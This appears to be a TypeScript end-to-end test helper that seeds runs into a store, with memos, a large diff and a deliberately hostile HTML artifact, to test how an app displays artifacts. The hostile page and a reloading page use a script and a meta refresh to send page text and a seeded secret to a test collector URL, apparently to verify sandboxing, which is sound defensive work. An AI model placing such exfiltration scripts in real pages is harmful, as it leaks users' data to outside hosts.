/**
 * Test-side seeding for the artifact-view specs (F05, F13): runs written straight into the suite's own store
 * (BYWAY_E2E_DATA_DIR) through @byway/store, after the demo server is up. No product route writes them.
 *
 * Why this is sound: the Run screen reads runs from the store only (the runner's view), and lost runs are reconciled only
 * when the engine starts, so a run written here shows as it was written. A seeded question has no workflow behind it, so
 * the specs never answer one (the runner would settle the run as lost); `unseed` withdraws them and ends the runs, so
 * nothing seeded is left waiting for later specs. The Run screen shows one question at a time, so each question kind
 * gets its own run.
 */
import { randomUUID } from 'node:crypto';
import type { CheckpointKind, CheckpointOption, Medium, RunEvent } from '@byway/contracts';
import { createStore, type SqliteStore } from '@byway/store';

export interface SeededRun {
  runId: string;
  checkpointId?: string;
}

export interface Seeded {
  /** A hostile page: its script, or its meta refresh a second later, carries its text to the collector. */
  hostile: string;
  /** A page that, once its scripts run, reloads itself from inside its frame. */
  reloader: string;
  /** 19.5 KB of Markdown whose last words are MEMO_TAIL, with a link to the hostile page at its start. */
  memo: string;
  /** A 54 KB unified diff: 12 files, +480 −480. */
  diff: string;
  /** Two memos of about 17 KB that differ only in their closing paragraph. */
  memoA: string;
  memoB: string;
  /** Ended: the four step artifacts above, and the hostile page as its deliverable. */
  done: SeededRun;
  pick: SeededRun;
  compare: SeededRun;
  react: SeededRun;
}

export const MEMO_TAIL = 'F13 memo tail sentinel: the last sentence of the long memo.';
export const ENDING_A = 'F13 ending A: we will pursue the synergies.';
export const ENDING_B = 'F13 ending B: we will fund the three projects above.';
/** What the hostile page posts to its frame's parent when its scripts run. */
export const RAN = 'byway-e2e:ran';

export function seedDataDir(): string | undefined {
  return process.env.BYWAY_E2E_DATA_DIR;
}

function openStore(): SqliteStore {
  const dataDir = seedDataDir();
  if (!dataDir) throw new Error('BYWAY_E2E_DATA_DIR is not set: run the suite with pnpm e2e or the Playwright config.');
  return createStore({ dataDir });
}

const paragraph = (i: number) =>
  `Paragraph ${i}. The quarter went much as planned: the team shipped the two releases it promised, hired for the open roles, and kept spending inside the budget the board agreed in spring. ` +
  'Nothing here changes the plan; it records what happened and what comes next, in that order, so the reader can check it.';

/** Markdown of at least `bytes` bytes, ending with `ending`. */
function memoText(title: string, bytes: number, ending: string, lead = ''): string {
  const parts = [`# ${title}`, lead];
  for (let i = 1; Buffer.byteLength(parts.join('\n\n')) < bytes; i++) parts.push(paragraph(i));
  parts.push(ending);
  return parts.filter((p) => p !== '').join('\n\n');
}

/** 12 files, each one hunk of 40 removed and 40 added lines: +480 −480, about 54 KB. */
function diffText(): string {
  const files: string[] = [];
  for (let f = 1; f <= 12; f++) {
    const lines = [`diff --git a/src/module-${f}.ts b/src/module-${f}.ts`, `--- a/src/module-${f}.ts`, `+++ b/src/module-${f}.ts`, '@@ -1,40 +1,40 @@'];
    for (let i = 1; i <= 40; i++) lines.push(`-export const setting${i} = readSetting('module-${f}-setting-${i}', 0);`);
    for (let i = 1; i <= 40; i++) lines.push(`+export const setting${i} = readSetting('module-${f}-setting-${i}', 1);`);
    files.push(lines.join('\n'));
  }
  return `${files.join('\n')}\n\nWhy: Every setting now defaults to 1, which the review asked for.`;
}

async function stepWithArtifact(store: SqliteStore, runId: string, stepId: string, label: string, artifactId: string, mediaType: string): Promise<void> {
  const event = (type: RunEvent['type'], data: Record<string, unknown>) => store.appendEvent({ runId, type, stepId, data });
  await event('step-started', { label, stage: 'D2', actor: 'model' });
  await event('artifact', { artifactId, mediaType, label });
  await event('step-finished', { costUsd: 0 });
}

async function newRun(store: SqliteStore, title: string, recipeId: string, medium: Medium): Promise<string> {
  const workspace = await store.ensureDefaultWorkspace();
  const runId = randomUUID();
  await store.createRun({ id: runId, workspaceId: workspace.id, recipeId, recipeHash: 'e2e-seeded', profileId: 'demo', title, problem: title, medium, budgetUsd: 2, status: 'running' });
  await store.appendEvent({ runId, type: 'run-started', data: { budgetUsd: 2 } });
  return runId;
}

async function question(store: SqliteStore, title: string, recipeId: string, medium: Medium, kind: CheckpointKind, more: { options?: CheckpointOption[]; artifactIds?: string[]; k?: number }): Promise<SeededRun> {
  const runId = await newRun(store, title, recipeId, medium);
  const stepId = `e2e-${kind}`;
  const checkpointId = randomUUID();
  await store.appendEvent({ runId, type: 'step-started', stepId, data: { label: 'Your choice', stage: 'D2', actor: 'human' } });
  await store.openCheckpoint({ id: checkpointId, runId, stepId, kind, prompt: `Seeded ${kind} question (do not answer)`, ...more });
  await store.appendEvent({ runId, type: 'checkpoint-opened', stepId, data: { checkpointId, kind } });
  return { runId, checkpointId };
}

export async function seed(collector: string): Promise<Seeded> {
  const store = openStore();
  try {
    const put = async (text: string, type: string) => (await store.artifacts.putText(text, type)).id;
    const hostile = await put(
      `<!doctype html><title>Hostile page</title><meta http-equiv="refresh" content="1;url=${collector}/hit?via=seeded-meta&amp;data=F05_SEEDED_SECRET"><p>F05_SEEDED_SECRET</p>` +
        `<script>parent.postMessage('${RAN}', '*'); location.href = '${collector}/hit?via=seeded-script&data=' + encodeURIComponent(document.body.innerText);</script>`,
      'text/html',
    );
    const reloader = await put(
      `<!doctype html><title>Reloading page</title><p>Reloads itself once its scripts run.</p>` +
        `<script>if (window.name !== 'reloaded') { window.name = 'reloaded'; parent.postMessage('ran:first', '*'); location.reload(); } else { parent.postMessage('ran:again', '*'); location.href = '${collector}/hit?via=seeded-reload'; }</script>`,
      'text/html',
    );
    const memo = await put(memoText('Quarterly memo', 19_400, MEMO_TAIL, `See [the draft page](/artifacts/${hostile}) for the launch.`), 'text/markdown');
    const diff = await put(diffText(), 'text/x-diff');
    const memoA = await put(memoText('Status memo', 17_000, ENDING_A), 'text/markdown');
    const memoB = await put(memoText('Status memo', 17_000, ENDING_B), 'text/markdown');

    const doneId = await newRun(store, 'Seeded: finished page (F05, F13)', 'c1', 'web-page');
    await stepWithArtifact(store, doneId, 'e2e-page', 'Hostile page', hostile, 'text/html');
    await stepWithArtifact(store, doneId, 'e2e-reload', 'Reloading page', reloader, 'text/html');
    await stepWithArtifact(store, doneId, 'e2e-memo', 'Long memo', memo, 'text/markdown');
    await stepWithArtifact(store, doneId, 'e2e-diff', 'Big diff', diff, 'text/x-diff');
    await store.appendEvent({ runId: doneId, type: 'run-finished', data: {} });
    await store.updateRun(doneId, { status: 'done', outputArtifactId: hostile });

    const pick = await question(store, 'Seeded: pick (F05)', 'c1', 'web-page', 'pick', {
      k: 1,
      options: [
        { id: 'a', label: 'Draft one', artifactId: hostile },
        { id: 'b', label: 'Draft two', artifactId: memoA },
      ],
    });
    const compare = await question(store, 'Seeded: compare (F13)', 'c4', 'prose', 'compare', {
      options: [
        { id: 'A', label: 'Before the swaps', artifactId: memoA },
        { id: 'B', label: 'After the swaps', artifactId: memoB },
      ],
    });
    const react = await question(store, 'Seeded: react (F05)', 'c1', 'web-page', 'react', { artifactIds: [hostile] });
    return { hostile, reloader, memo, diff, memoA, memoB, done: { runId: doneId }, pick, compare, react };
  } finally {
    store.close();
  }
}

/** Ends the seeded runs that are still going, withdrawing their questions, so no later spec sees them waiting. */
export async function unseed(seeded: Seeded | undefined): Promise<void> {
  if (!seeded) return;
  const store = openStore();
  try {
    for (const { runId } of [seeded.pick, seeded.compare, seeded.react]) {
      await store.withdrawCheckpoints(runId);
      await store.updateRun(runId, { status: 'cancelled' });
    }
  } finally {
    store.close();
  }
}
